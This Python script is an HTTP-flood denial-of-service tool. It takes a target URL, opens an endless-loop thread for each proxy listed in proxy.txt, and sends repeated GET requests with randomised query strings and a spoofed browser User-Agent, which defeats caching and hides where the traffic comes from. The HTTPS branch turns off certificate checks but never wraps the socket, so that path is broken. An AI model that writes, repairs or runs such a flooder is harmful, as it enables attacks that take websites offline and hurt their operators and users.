import socket
import socks
import ssl
import threading
import time
import random
import string
# 

def get_proxy_list(file_path):
    proxies = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                if "://" in line:
                    proxy_type, address = line.split("://", 1)
                    proxy_type = proxy_type.lower()
                    if ":" in address:
                        host, port = address.rsplit(":", 1)
                        port = int(port)
                    else:
                        host = address
                        port = 1080 if proxy_type.startswith('socks') else 80
                    proxies.append((proxy_type, host, port))
    except Exception as e:
        print(e)
    return proxies

def create_random_id(length=8):
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def get_url_details(url):
    if url.startswith("https://"):
        use_ssl = True
        url_no_proto = url[8:]
    elif url.startswith("http://"):
        use_ssl = False
        url_no_proto = url[7:]
    else:
        raise ValueError("URL must start with http:// or https://")

    if "/" in url_no_proto:
        host_part, path = url_no_proto.split("/", 1)
        path = "/" + path
    else:
        host_part = url_no_proto
        path = "/"

    if ":" in host_part:
        host, port = host_part.split(":")
        port = int(port)
    else:
        host = host_part
        port = 443 if use_ssl else 80

    return host, port, path, use_ssl

def start_connection_loop(proxy_type, p_host, p_port, t_host, t_port, base_path, use_ssl):
    ssl_context = ssl.create_default_context() if use_ssl else None

    while True:
        s = None
        try:
            s = socks.socksocket()

            # 根据代理类型设置不同的代理
            if proxy_type == 'http':
                s.set_proxy(socks.HTTP, p_host, p_port)
            elif proxy_type == 'socks4':
                s.set_proxy(socks.SOCKS4, p_host, p_port)
            elif proxy_type == 'socks5':
                s.set_proxy(socks.SOCKS5, p_host, p_port)
            else:
                print(f"Unsupported proxy type: {proxy_type}")
                return

            s.settimeout(5)

            s.connect((t_host, t_port))

            client = s
            if use_ssl:

                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False          # 跳过主机名验证
                ssl_context.verify_mode = ssl.CERT_NONE     # 跳过证书有效性验证
            else:
                ssl_context = None

            random_path = f"{base_path}{'&' if '?' in base_path else '?'}q={create_random_id()}"
            request = (
                f"GET {random_path} HTTP/1.1\r\n"
                f"Host: {t_host}\r\n"
                "User-Agent: 	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36 Edg/151.0.0.0\r\n"
                "Connection: close\r\n\r\n"
            ).encode('utf-8')

            client.sendall(request)

        except Exception as e:
            print(e)
        finally:
            if s:
                s.close()

def run_app():
    try:
        user_input = input("Please enter full URL: ").strip()
        t_host, t_port, base_path, use_ssl = get_url_details(user_input)
    except Exception as e:
        print(f"{e}")
        return

    proxy_list = get_proxy_list("proxy.txt")
    if not proxy_list:
        print("Proxy list is empty or proxy.txt not found.")
        print("Format: type://host:port")
        print("Examples:")
        print("  socks5://127.0.0.1:1080")
        print("  socks4://185.157.111.3:5678")
        print("  http://82.115.60.51:80")
        return

    print(f"Target: {t_host}:{t_port}{base_path}")
    print(f"Starting threads for {len(proxy_list)} proxies...")

    for proxy_type, p_host, p_port in proxy_list:
        t = threading.Thread(
            target=start_connection_loop,
            args=(proxy_type, p_host, p_port, t_host, t_port, base_path, use_ssl)
        )
        t.daemon = True
        t.start()

    try:
        while True:
            time.sleep(1)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    run_app()
